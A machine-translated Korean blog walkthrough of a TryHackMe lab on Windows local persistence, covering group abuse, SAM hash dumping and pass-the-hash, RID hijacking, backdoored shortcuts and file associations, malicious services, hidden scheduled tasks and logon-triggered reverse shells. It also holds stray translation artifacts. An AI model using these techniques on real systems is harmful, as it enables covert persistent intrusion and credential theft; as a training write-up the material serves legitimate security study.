---
title: "창 프로그래밍의 로컬 지속 기술  TryHackMe"
description: ""
coverImage: "/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_0.png"
date: 2024-06-19 15:30
ogImage: 
  url: /assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_0.png
tag: Tech
originalTitle: "Windows Local Persistence Techniques | TryHackMe"
link: "https://medium.com/@jamesjarviscyber/windows-local-persistence-techniques-tryhackme-43a946ff6720"
---


<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_0.png" />

축하합니다! 희생자의 시스템에 스스로 매듭을 풀었고 이제 당신은 ... 안돼, 죄송합니다만, 액세스 권한을 잃었고 액세스 경로가 막혔습니다. 이제 뭘 해야 할까요?

만약 쉽게 다시 접근할 수 있는 방법을 채택했다면 좋았을텐데요. 초기 액세스에 의존하는 것은 위험합니다. 그것이 막힌다면 액세스를 잃게 됩니다. 일부 액세스 지점은 처음부터 안정적이지 않을 수 있습니다. 발판을 유지하기 위한 조치를 취해야 합니다.

한편, 취약한 시스템의 소유자라면, 지속성 기회가 쉽게 제공되지 않도록 해야 합니다. 패치가 항상 최종 해결책은 아닙니다. 이것을 알고 있는 것이 적절한 보안과 강력한 보안을 구분짓습니다.

<div class="content-ad"></div>

이 문서에는 저가 하는 과정에서 범한 실수와 올바른 해결책이 함께 나와 있습니다.

언급 부분은 충분합니다. 이 깃발에는 달성해야 할 여러 깃발이 있으므로 바로 시작합시다! 이 문서는 상세히 제시된 정보를 다루지 않겠습니다. 정답을 찾기 위해 읽고 계신다면, 실제로 무엇을 하고 있는지 이해했는지 확인하는 것이 좋습니다.

# 과제 2: 특권이 없는 계정 조작

관리자 계정은 종종 잘못 다루는 것을 모니터링합니다; 일반 계정은 그렇지 않기 때문에 이를 우리에게 유리하게 사용할 수 있습니다.

<div class="content-ad"></div>

이 작업은 이미 관리자 권한을 획득했다고 가정합니다. 작업의 목표는 그 관리자 권한을 유지하는 것입니다.

## Flag 1:

먼저, 이 작업에는 AttackBox에서 evil-winrm을 사용하고 있습니다. 관리자 계정으로 로그인한 후에 우리는 이 지점에 있습니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_1.png)

<div class="content-ad"></div>

언제나 ls를 확인해보는 것이 좋아요.

저희는 관리자입니다 — 하지만 항상 그럴 것을 보장할 수는 없어요. 저희는 접근에 지속성을 놓는 것이 필요해요.

기존 사용자를 관리자 그룹으로 옮겨서 이를 할 수 있어요:

```js
net localgroup administrators thmuser0 /add
```

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_2.png)

이제, '관리자' 그룹에 추가하는 것은 쉽게 알아차릴 수 있고 상당히 의심스러운 일로 간주될 수 있습니다. 우리는 의심을 피하고 싶어요!

다른 옵션으로는 사용자를 '백업 연산자' 그룹에 추가하는 것이 있습니다. 이 그룹은 관리자 권한을 부여하지는 않지만, 시스템의 모든 파일 및 레지스트리 키를 읽기/쓰기할 수 있는 권한을 제공해줍니다. 정말 강력한 기능이죠! 이를 통해 우리는 필요한 해시를 얻기 위해 SAM 및 SYSTEM 하이브를 이용할 수 있게 될 겁니다.

![이미지2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_3.png)


<div class="content-ad"></div>

관리자 계정이 아닌 이 계정은 현재 RDP를 통해 액세스할 수 없습니다. 이를 위해 '원격 관리 사용자' 그룹에 추가해야 합니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_4.png)

좋아요 — 관리자 계정에서 로그아웃한 후 thmuser1을 통해 액세스해 보겠습니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_5.png)

<div class="content-ad"></div>

빠른 조치 플래그는 없어요 — 하지만 보시다시피, 우리는 계정에 쉽게 접근했습니다. 실제로 암호가 이렇게 기본적일 확률은 낮지만 여기서 중요한 교훈은 원칙입니다.

우리가 속해 있는 그룹을 확인해봅시다:

```js
whoami /groups
```

![그룹 확인](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_6.png)

<div class="content-ad"></div>

이건 흥미로운데요. 우리가 '백업 작업자' 그룹의 일부라는 것은 알고 있지만, 그 그룹 자체가 비활성화되어 있어요! 음, 이건 도움이 안 돼요. 그런데 왜 그런 걸까요?

음... 보안 때문이에요. 사용자 액세스 제어(LocalAccountTokenFilterPolicy)는 RDP를 통해 연결하는 사용자의 관리자 권한을 비활성화하여 우리와 같은 침입자를 방지할 수 있어요. 방해받았네요 — 방을 떠날 시간이 되었어요.

하지만... 해결책이 있을지도 모르겠네요.

접근 가능한 주요 관리자 계정을 통해 다음과 같이 이 기능을 비활성화할 수 있어요:

<div class="content-ad"></div>

```js
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_7.png)

이제 thmuser1로 돌아가서 우리 작은 문제가 해결되었는지 확인해 보겠습니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_8.png)


<div class="content-ad"></div>

오호~ 크리스마스 같은 느낌이야! 이제는 우리 그룹을 효과적으로 활용할 수 있겠네요. SYSTEM과 SAM 파일의 백업을 만들고, 그 후에는 공격용 머신으로 이 파일들을 다운로드할 거에요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_9.png)

이제 secretsdump.py를 사용하여 해시를 추출할 수 있어요:

```js
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

<div class="content-ad"></div>


![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_10](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_10.png)

Look at all of our produce! How glorious, now: let’s test out the administrator hash. We will login again with evil-winrm, but this time instead of a password, we will use the -H flag for our hash:

![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_11](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_11.png)

As you can see, I’m not flawless — I copied too much!


<div class="content-ad"></div>

이제 Flag 1을 실행하는 필수 파일을 실행합니다:

![Flag 1 파일](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_12.png)

좋아요!

답변: THM'FLAG_BACKED_UP!'

<div class="content-ad"></div>

# Flag 2

다음 플래그는 이전 게시물에서 탐구한 SeBackup 및 SeRestore를 악용합니다.

백업 연산자들은 SeBackupPrivilege(모든 파일 읽기)와 SeRestorePrivilege(모든 파일 쓰기)에 액세스할 수 있습니다. 그러나 이러한 권한을 가지려면 반드시 백업 연산자 그룹의 구성원이어야 할 필요는 없습니다.

이를 악용하기 위해 secedit을 조작할 수 있습니다. secedit은 보안 설정을 확인할 수 있으며, 우리는 이를 변경할 수 있습니다.

<div class="content-ad"></div>


```js
secedit /export /cfg config.inf
```

![Image 1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_13.png)

![Image 2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_14.png)

이 시점에서 저의 방법은 THM 방과 상당히 다릅니다. 어떤 이유로 RDP에 접속 권한을 잃었기 때문에 다른 경로를 시도했습니다. 컴퓨터를 재부팅해야 할 수도 있지만, 지금은 이 방법이 작동하는지 확인해 보겠습니다.


<div class="content-ad"></div>

config.inf 파일을 attackbox로 다운로드했고, 그에 따라 편집을 진행했어요:

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_15.png)

그것은 쉬운 부분이었어요 — 이제 Administrator 계정에 업로드할 차례에요. http.server를 설정해보고 어떤 일이 벌어지는지 확인해봐요. 또한 config 파일의 이름을 altconfig.inf로 변경했어요.

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_16.png)

<div class="content-ad"></div>

메인 시스템에서 wget을 실행하면 끝이에요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_17.png)

좋아요, 계속 진행합시다. 이름이 문제가 될 일 없길 바라지만, 만약에 그렇다면 내 구성 버전을 다운로드할 수 있어요. 근데 진짜 귀찮긴 하죠, 그건 인정해야 합니다!

잘 되었어요. secedit을 변경한 이후에 config.inf로 저장했습니다. 이렇게 하면 어떤 문제도 방지될 거에요:

<div class="content-ad"></div>

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_18.png" />

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_19.png" />

안녕하세요! 문제 없이 작업을 완료했네요. 그런데 GUI에 접근해야 하는데 문제가 생겼어요.

마침내 AttackBox의 xfreerdp를 통해 액세스할 수 있었어요. 아래에서 제 혼란스러운 시도를 볼 수 있습니다!

<div class="content-ad"></div>

중요한 건 결국 만들었다는 것이에요.

PowerShell 시간이에요. 권한을 변경하길 희망하고 있어요.

![이미지 1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_20.png)

![이미지 2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_21.png)

<div class="content-ad"></div>

다른 경로로 THM 예제를 찾아봅시다. — 이게 작동하는지 확인해보겠습니다.

![이미지1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_22.png)

안 됐네요 — 이전에 찾은 해시를 시도해보죠.

![이미지2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_23.png)

<div class="content-ad"></div>

죄송하지만, 테이블 태그를 마크다운 형식으로 변경해 주실 수 있나요?

<div class="content-ad"></div>


![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_25.png)

Lesson: If it isn’t working, you’re the problem.

OH

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_26.png)


<div class="content-ad"></div>

해시 없이 로그인을 시도해 봅시다...

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_27.png)

음... 난 문제를 해결할 수 없어. 설정 파일이나 RDP 문제에서 오는 문제일 것 같아. 권한이 없다는 걸 볼 수 있지:

![image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_28.png)

<div class="content-ad"></div>

이걸 해결해 봅시다. 꽤 가능성을 봐도 되지만, 그렇게 되면 아무 것도 배우지 못하죠. xfreeRDP를 통해 다시 한 번 시도해 봐요.

![image_1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_29.png)

재미있게도, 원본 설정 파일이 여전히 문서 폴더에 있었어요. 나중에 그것들을 삭제했어요. 이번에는 됐으면 좋겠네요.

![image_2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_30.png)

<div class="content-ad"></div>

아래와 같이 표 태그를 Markdown 형식으로 변경해주세요.


| Tag 1 | Tag 2 |
|-------|-------|
| Data1 | Data2 |


<div class="content-ad"></div>


![Screenshot](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_33.png)

서버 측 문제일 것 같네요. 방이 끝났지만, 타이머는 계속 돌아가고 있어요. 이번 방을 잠시 멈추고 나중에 플래그 3부터 다시 시작하려고 해요. 두 번 해야 하는 이 작업 덕분에, 이번에는 가이드 원칙을 더 잘 이해하게 되었어요. 여러분도 그럴 수 있을 거에요!

플래그: THM'IM_JUST_A_NORMAL_USER'

# 플래그 3


<div class="content-ad"></div>

IP를 변경하고, 필요한 경우 자체 Kali Linux를 사용합니다. 공격 상자가 아닙니다.

RID 해킹(Relative Identifier Hijacking)은 사용자의 RID를 변경하여 더 높은 권한을 부여하는 사용자를 흉내내는 방법으로, 권한 상승을 수행합니다. RID 스푸핑도 가능합니다.

wmic(Windows Management Instrumentation Command-line)은 Windows 시스템에서 정보를 검색하는 데 사용할 수 있습니다. cmd와는 다른 구문을 사용합니다.

```js
wmic useraccount get name, sid
```

<div class="content-ad"></div>

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_34.png" />

이제 우리는 SIDs(보안 식별자) 목록을 가지고 있습니다. 마지막 -###는 RID입니다. 기본적으로 관리자 계정은 500이고 일반 사용자는 보통 1000부터 시작합니다.

여기서 RID 하이재킹의 요령은 thmuser3를 1010에서 500으로 변경하는 것입니다. 개념적으로는 간단한 일입니다. 하지만 이를 실제로 실행해 봅시다.

pstools는 시스템 정보를 수집하고 검색하는 데 도움이 되는 프로그램 모음입니다. 우리는 원격으로 프로세스를 실행할 수 있는 PsExec을 사용할 것입니다. 이것은 우리가 원격으로 연결 중이라는 것을 기억해야 하므로 훌륭한 방법입니다.

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_35.png)

변경이 필요한 RID Hijack을 수행할 때 레지스트리 편집기를 통해 변경사항을 가할 수 있습니다.

그 후, 로컬 머신으로 이동하여 대상 계정을 찾습니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_36.png)


<div class="content-ad"></div>

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_37.png" />

그럼 16진수로 0x01F4는 500, 우리가 필요한 RID 입니다.

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_38.png" />

이제 제 Kali Linux부터 xfreeRDP를 사용하여 연결해 보도록 하죠:

<div class="content-ad"></div>


![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_39](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_39.png)

![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_40](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_40.png)

플래그 명령을 실행해보고 작동하는지 확인해 봅시다. 하지만 보시다시피, thmuser3이 여전히 1010 RID를 가지고 있더라도 thmuser3을 통해 어드민 뷰를 확인할 수 있습니다.

![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_41](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_41.png)


<div class="content-ad"></div>

너무 쉬워요! 그냥 헥스 코드를 바꾸면 돼요!

답변: THM'TRUST_ME_IM_AN_ADMIN'

# 플래그 5

다시 다른 IP 주소에 주의하세요

<div class="content-ad"></div>

Flag4은 존재하지 않는 것처럼 보입니다. 그러나 Flag5 및 Flag6은 후문 악용에 초점을 맞춥니다. 공격자가 흔히 사용되는 파일을 통해 액세스 권한을 얻는 것입니다. 이러한 파일을 후문이 포함된 파일로 수정할 때는 이러한 파일이 작동하는 방식을 변경하지 않도록 해야 합니다. 그렇게 하면 의심을 사주게 될 수 있습니다.

시작하기에 좋은 곳은 그들의 데스크톱을 살펴보는 것입니다. 프로그램에 대한 바로 가기가 있는 경우에는 흔히 사용되는 실행 파일일 가능성이 높습니다.

이 작업을 위해 계산기를 볼 수 있습니다:

![Calculator](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_42.png)

<div class="content-ad"></div>

위에서 볼 수 있듯이, 지름길은 대상 위치로 이어집니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_43.png)

이 방에서는 사용할 수 있는 미터프레터(exploit)에 대해 이야기합니다. 이 방법도 작동하지만, 일련의 깃발(flag)이 필요하지 않는 더 은밀한 방법들도 있습니다.

사용자가 잘 살펴보지 않을 디렉터리에 파일을 숨길 것입니다. 문서나 데스크탑에 저장하는 것은 눈에 띄고 큰 의심을 살 수 있습니다. 대신, 우리는 눈에 잘 띄지 않아야 합니다 — 파일을 일반적인 사용 중에 잘 탐색되지 않을 /Windows/System32에 숨길 것입니다.

<div class="content-ad"></div>

저희는 역쉘을 활성화하고 동시에 계산기를 열 수 있는 스크립트를 만들어야 합니다. 저는 Powershell ISE를 사용했어요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_44.png)

이 명령은 시스템에 셸을 열지 않고 (-NoNewWindow) 의심을 받을 가능성을 줄입니다.

아니요, 우리는 계산기 바로 가기를 다시 방문하고 대상 위치를 조정해야 합니다:

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_45.png)

이 명령어는 Powershell을 백그라운드에서 열어서 C:\Windows\System32\backdoor.ps1으로 저장한 스크립트를 실행합니다.

리스너를 설정해봐요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_46.png)


<div class="content-ad"></div>

그럼 이제 갔다! 계산기를 사용하여 공격용 기기에 쉘 액세스를 확보했어요!

이제까지 플래그를 실행해 봅시다:


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_47.png)

답변: THM'NO_SHORTCUTS_IN_LIFE'


<div class="content-ad"></div>

# Flag 6

이번에는 파일 연결을 탈취하겠습니다. 파일이 어떻게 열리고 작동하는지 악용하고 있습니다. 간단히 말해, 파일 유형이 열릴 때 추가 명령을 실행하고 있습니다. 특히, 우리는 주요 레지스트리 데이터를 악용하고 있습니다.

이전과 마찬가지로, 우리는 우리의 악용이 실제로 악용될 곳에 배치하고 싶습니다. 파일 유형 내에서 순화되게 사용되지 않는 곳에 숨는 것은 의미가 없습니다. 이러한 이유로 .txt 파일을 사용할 것입니다.

![Image](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_48.png)

<div class="content-ad"></div>

텍스트 파일을 악용할 것이며, 이는 txtfile 클래스를 찾는 것을 의미합니다:

![img1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_49.png)

간단히 말해, 텍스트 파일이 열릴 때 실행되는 명령입니다. 이를 우리의 필요에 맞게 변경할 수 있습니다.

![img2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_50.png)

<div class="content-ad"></div>

이걸 만들기 위해 Powershell ISE를 사용했어요. 이 코드는 이전 작업과 비슷하게 작동해요: .txt 파일을 열면 새로운 창이 나타나지 않는 프로세스가 시작되고 역쉘이 실행돼요. 공격 중인 내 컴퓨터에서 cmd.exe 액세스를 얻게 될 거예요.

$args[0] 부분은 이전 스크린샷에서 본 %1을 재현할 거예요.

한 번 더, 리스너를 설정해봐요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_51.png)

<div class="content-ad"></div>

거의 다 왔어요. 레지스트리 키의 경로를 변경해 봅시다. 기억하세요, 이 정보는 확인되기 어려운 것이 중요해요. 확인되는 것을 방지하려면 일반 프로그램이 의도한 대로 작동하는지 확인해야 합니다.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_52.png)

기억하세요, 이것은 숨겨진 Powershell에서 스크립트를 실행할 것입니다.

활성화하려면 단순히 텍스트 파일을 열기만 하면 됩니다. 그러니 그것을 해봅시다. 먼저, 열 파일을 만들어 볼게요:

<div class="content-ad"></div>

쉘을 통해 6번 깃발을 활성화합니다:

![flag 6](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_53.png)

여기 있습니다. 그들은 너를 다치게 할 수 없어요 — 혹시 다칠 수도 있나요?

답: THM'TXT_FILES_WOULD_NEVER_HURT_YOU'

<div class="content-ad"></div>

# 서비스 남용

# Flag 7

언제 마지막으로 실행 중인 서비스 목록을 검토했나요?

정확히 맞아요.

<div class="content-ad"></div>

아무도 서비스를 확인하지 않는다는 사실을 이용하고 있네요. 사람들이 왜 확인해야 할까요? 일반 사람에게는 그럴 이유가 없어요.

이 익스플로잇은 서비스를 남용하고, 컴퓨터와 함께 부팅되는 서비스로 역쉘을 생성합니다.

서비스를 만들어 봅시다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_54.png)

<div class="content-ad"></div>

이제 순서를 헷갈렸을 수도 있지만, 실제로 존재하지 않는 파일을 실행하는 것이 매우 어려다는 것을 깨달았어요..!

그래서 칼리에서 피해자 컴퓨터로 rev-svc 파일을 전송해야 했어요. 단순히 wget이 작동할 것이라고 생각했는데, 아니었어요. 빠른 파워셸 연구를 하게 되었고, Invoke-WebRequest가 동일한 효과를 낼 수 있다는 것을 알게 되었어요. 스크린샷에서 제 실수를 볼 수 있지만, 그렇게 배우는 법이죠:

피해자 컴퓨터에 파일을 가져왔으니 이제 서비스를 실행할 수 있어요. 저의 리스너는 쉘을 수신할 준비가 되어 있어요: 

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_55.png)

<div class="content-ad"></div>

제가 뭔가 잘못해서 작동하지 않았습니다. 과정을 다시 되짚어가며 주의 깊게 확인해야 할 것 같아요. 뭔가 빠뜨린 게 있을 거에요.

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_56.png" />

여기서 뭔가 잘못한 것 같아요. 다시 시작해야겠어요. 이전에 무엇이 잘못되었는지 설명하면서 다시 시작하겠어요.

알겠어요, 이 단계로 다시 돌아왔어요:

<div class="content-ad"></div>

하하! 결국 치명적인 결함을 해결했어요. 다운로드하려는 것이 없었던 걸 깨달았거든요. 그래서 그에 대응하여 파일 이름을 "nothing"으로 바꿨어요. 이 스크린샷에서 주소에 페이로드를 추가한 것을 주목해 주세요. 이전에는 이 작업을 하지 않았기 때문에 실제로 아무것도 다운받지 않았던 거죠. 어리석은 실수네요.

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_57.png)

흥분해서 실수를 하다가(스크린샷 참고), 의도대로 서비스를 시작하여 내 컴퓨터에서 셸을 얻는 데 성공했어요. '현실 세계'에서는 셸을 이렇게 명확하게 명명하거나 명백한 위치에 두지 않겠지요. 좋은 실천은 쉽게 접하지 않는 곳에 숨겨두는 것이죠.

서비스가 수상한데, 투표해서 킥해주세요.

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_58.png)

답변: THM'SUSPICIOUS_SERVICES'

# Flag 8:

서비스는 쉽게 악용될 수 있습니다. 지금까지 우리는 새로운 서비스를 추가했지만, 왜 귀찮게 할까요? 기존 서비스를 수정할 수도 있습니다. 이것이 좀 더 교활한 방법입니다 — 만약 누군가가 의심스러운 서비스 이름을 검색하려 한다면, 그들은 그런 것을 찾지 못할 것입니다.


<div class="content-ad"></div>

이 작업은 THMservice3를 중심으로 합니다. 함께 자세히 살펴봅시다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_59.png)

binPath를 페이로드로 지정해야 합니다. 또한 AutoStart로 설정하여 사용자가 상호작용할 필요가 없도록 하고 싶습니다! 마지막으로, SERVICE_START_NAME은 LocalSystem이어야 합니다. 이렇게 하면 우리가 열망하는 권한을 부여받을 수 있습니다.

간단하게 하기 위해 이전과 동일한 페이로드를 사용할 것입니다. 이를 위해 THMservice2를 삭제할 것입니다.

<div class="content-ad"></div>


![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_60.png)

BINARY_PATH_NAME, start, 및 SERVICE_START_NAME을 조정하여 우리의 악의적인 목적에 맞게 맞추었습니다. 그런 다음 리스너를 설정하고 서비스를 시작했습니다:

정말 간단하죠!

답변: THM'IN_PLAIN_SIGHT'


<div class="content-ad"></div>

#  작업 스케줄러

#  Flag 9

예약된 작업 - 기계에서 필수이며, 보호가 불충분하다면 쉽게 악용될 수 있습니다. 우리는 THM-backdoor라는 새 작업을 생성할 것입니다 (이를 수행하지 않으면 플래그를 획득할 수 없습니다).

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_61.png)

<div class="content-ad"></div>

여기에 상당히 많은 플래그가 있네요, 함께 살펴보죠:

- `schtasks /create`: 새 작업 생성
- `/sc` 및 `/mo`: 작업을 매 분 실행하도록 설정
- `/tr`: 파일 경로

<div class="content-ad"></div>

/ru SYSTEM을 통해 시스템 권한으로 실행할 수 있습니다.

이제 이것만으로 셸 권한을 얻을 수 있습니다. 하지만 우리는 지속성을 보장하고 싶습니다. 현재, 우리의 작업은 물론 이름이 명확하고 쉽게 찾을 수 있습니다. 이를 숨기기 위해 난해하게 만들어야 합니다.

레지스트리로 이동하여 SecurityDescriptor (SD)를 삭제할 것입니다. 이렇게 하면 백도어 작업을 숨겨 피해자가 찾기 어려워집니다:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_62.png)

<div class="content-ad"></div>

다시 검색했지만 찾을 수 없습니다 — 피해자가 안전한 걸까요?

![image 1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_63.png)

아니요.

![image 2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_64.png)

<div class="content-ad"></div>

이 쉘이 즉시 생성되지 않을 수 있다는 것을 유의하고 기억하는 것이 좋습니다. 예약된 작업으로, nc64.exe가 매 분마다 실행됩니다.

답변: THM'JUST_A_MATTER_OF_TIME'

# 로그온 트리거 지속성

# Flag10

<div class="content-ad"></div>

우리의 notepad.exe 취약점과 유사하지만 기본적으로 보장된 접근 방식을 악용합니다 — 사용자는 로그인해야 합니다!

각 사용자는 장치를 부팅할 때 활성화/비활성화할 수 있는 '시작' 폴더를 가지고 있습니다. 개인적으로 부팅 프로세스를 가속화하기 위해 활성화된 애플리케이션이 매우 적지만, 우리가 이용할 수 있는 몇 가지 기본 및 필수 프로그램이 있습니다.

```js
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

모든 사용자의 기본값을 강제로 변경할 수도 있습니다.

<div class="content-ad"></div>

표 태그를 Markdown 형식으로 변경해주세요.

<div class="content-ad"></div>

알겠어요, 이제 로그아웃하고 다시 로그인해야 합니다. 얘기해둬야 할 사항이 있어요. 이 셀이 작동하려면 먼저 리스너를 설정해야 해요. 잘 되는지 확인해 봐요:

여기까지는 공개: 작동하지 않았어요. 같은 셸을 사용하려고 하는 거가 문제가 됐을 수도 있어요 — 충돌일지도 몰라요! 그래서 단계를 만들었는데, 이번에는 포트를 4449로 설정했어요. 작동하는지 확인해 봅시다:

음... 왜일지는 모르겠지만 작동하지 않았어요. 다시 한 번, 제 단계를 주의 깊게 확인해야겠어요:

![이미지](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_66.png)

<div class="content-ad"></div>


![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_67.png](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_67.png)

I checked my commands, everything seems okay. I deleted the nothing.exe file to see if that prevents any issues:

![2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_68.png](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_68.png)

We can see that my revshell is activated in the startup settings:


<div class="content-ad"></div>

![이미지1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_69.png)

그래서 왜 작동하지 않나요? 내 생각으로는 이름을 변경했기 때문에 그럴 수 있다고 생각해요 — 하지만 난 확신이 없어요.

아무것도!

![이미지2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_70.png)

<div class="content-ad"></div>

뭐...또 다른 방법을 시도해 봤지만 여전히 막혀 있어. 내 오류를 볼 수 있다면 알려줘. 내가 보이질 않아. 정확히 작업을 다시 만들어 보았는데도 운이 없어. 고마워.

답변: THM'NO_NO_AFTER_YOU' 

# 플래그 11

이 플래그를 얻기 위해, 쉘의 과잉이 문제를 일으킨 것일지도 모르니, 기계를 재시작하기로 결정했어.

<div class="content-ad"></div>

지금은 레지스트리를 악용할 차례예요 — 여기에는 새로운 내용이 없군요! 일부 디렉터리는 로그인할 때 실행될 거에요. 따라서 위와 같이 이를 악용할 수 있어요:

![이미지 1](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_71.png)

![이미지 2](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_72.png)

우리가 해야 할 일은 레지스트리에 쉘을 활성화할 바이너리를 만드는 거에요.

<div class="content-ad"></div>

<img src="/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_73.png" />

로그아웃하고 다시 로그인해봅시다. 이제 작동하는지 확인해보겠어요.

그러나 제 경우에도 이 방법이 작동하지 않습니다. 왜 그런지 이해할 수 없어요. 전체 기계를 클래식하게 껐다 켠 후 어떻게 되는지 확인해볼게요. 솔직히 말해서, 이것이 정말 짜증나네요.

마침내 문제를 해결했어요. 파일을 exe-service로 저장하고 있었던 거였네요. 우리는 서비스를 실행하고 있지 않아요. 문제를 해결했을 때 너무나 만족스럽죠! 컴퓨터를 재부팅하니 제 머릿속도 리셋된 기분이네요. 우훗! 아마도 이전 문제에서 겪었던 문제일 것 같아요. 교훈: 문제는 아마도 당신에게 있을 거에요. 컴퓨터는 정보를 말 그대로 받아들이죠. 출력되지 않는다면 입력이 잘못된 것입니다.

<div class="content-ad"></div>

아래는 마크다운 형식으로 전환한 내용입니다:

![](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_74.png)

제 주장을 증명하기 위해 이제 셸을 갖고 있어요:

![](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_75.png)

![](/assets/img/2024-06-19-WindowsLocalPersistenceTechniquesTryHackMe_76.png)

<div class="content-ad"></div>

훠잇!

답변: THM'LET_ME_HOLD_THE_DOOR_FOR_YOU'

# 플래그 12

새로운 날, 새로운 IP 주소들...

<div class="content-ad"></div>

